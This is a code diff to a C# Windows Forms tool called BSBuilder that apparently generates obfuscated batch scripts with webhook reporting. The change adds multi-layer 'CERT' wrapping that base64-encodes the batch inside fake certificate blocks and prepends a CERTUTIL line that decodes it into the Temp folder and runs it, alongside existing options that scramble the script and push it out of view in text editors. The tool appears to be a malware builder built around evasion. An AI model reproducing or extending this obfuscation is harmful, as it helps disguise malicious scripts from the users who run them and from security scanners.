@@ -52,6 +52,7 @@ namespace BSBuilder
         bool confuse = Properties.Settings.Default.confuse;
         bool push = Properties.Settings.Default.push;
         bool cert = Properties.Settings.Default.cert;
+        int certlayers = Properties.Settings.Default.certlayers;
 
         string webhook = Properties.Settings.Default.webhook;
         string reportstartmsg = Properties.Settings.Default.reportstartmsg;
@@ -102,6 +103,7 @@ namespace BSBuilder
             confusecheckbox.Checked = Properties.Settings.Default.confuse;
             certcheckbox.Checked = Properties.Settings.Default.cert;
             pushcheckbox.Checked = Properties.Settings.Default.push;
+            CertLayerPicker.Value = Properties.Settings.Default.certlayers;
 
             webhooktextbox.Text = Properties.Settings.Default.webhook;
             reportstartmsgtextbox.Text = Properties.Settings.Default.reportstartmsg;
@@ -242,8 +244,16 @@ namespace BSBuilder
 
         public static string Base64Encode(string plainText)
         {
-            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
-            return System.Convert.ToBase64String(plainTextBytes);
+            try
+            {
+                var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+                return System.Convert.ToBase64String(plainTextBytes);
+            }
+            catch
+            {
+                MessageBox.Show("You most likely added too many CERT layers and ran out of memory.\n\nTry again with less than 30 layers.","Memory error");
+                return "Error";
+            }
         }
 
         void confusebatch()
@@ -429,6 +439,21 @@ namespace BSBuilder
             //Finished
             batch = confusedbatch;
         }
+        
+        void AddCert(int layers)
+        {
+            for (int i = 0; i < layers; i++)
+            {
+                string onelinebatch = Base64Encode(batch);
+                string cert = string.Empty;
+
+                if (onelinebatch == "Error") break;
+                else try { cert = string.Format("-----BEGIN CERTIFICATE----- {0} -----END CERTIFICATE-----", onelinebatch); } catch { MessageBox.Show("Probably too many CERT layers and you ran out of memory.","Error"); }
+
+                batch = "@echo off & CERTUTIL -f -decode \"%~f0\" \"%Temp%\\0.bat\" >nul 2>&1 & call \"%Temp%\\0.bat\" & Exit\n" + cert;
+            }
+        }
+
         private void buildbutton_Click(object sender, EventArgs e)
         {
             if (forcerestart)
@@ -593,10 +618,7 @@ namespace BSBuilder
                     //Cert (Kind of like an obfuscation but not at all.)
                     if (cert)
                     {
-                        string onelinebatch = Base64Encode(batch);
-                        string cert = string.Format("-----BEGIN CERTIFICATE----- {0} -----END CERTIFICATE-----", onelinebatch);
-
-                        batch = "@echo off & CERTUTIL -f -decode \"%~f0\" \"%Temp%\\0.bat\" >nul 2>&1 & call \"%Temp%\\0.bat\" & Exit\n" + cert;
+                        AddCert(certlayers);
                     }
 
                     //Push the batch script to the side, makes it hard to read if using default text editors
@@ -1169,6 +1191,7 @@ namespace BSBuilder
             Properties.Settings.Default.confuse = confuse;
             Properties.Settings.Default.push = push;
             Properties.Settings.Default.cert = cert;
+            Properties.Settings.Default.certlayers = certlayers;
 
             Properties.Settings.Default.webhook = webhook;
             Properties.Settings.Default.reportstartmsg = reportstartmsg;
@@ -1186,6 +1209,11 @@ namespace BSBuilder
             Properties.Settings.Default.batchlocation = batchlocation;
 
             Properties.Settings.Default.Save();
+        }
+
+        private void CertLayerPicker_ValueChanged(object sender, EventArgs e)
+        {
+            certlayers = Convert.ToInt32(CertLayerPicker.Value);
         }
     }
 }
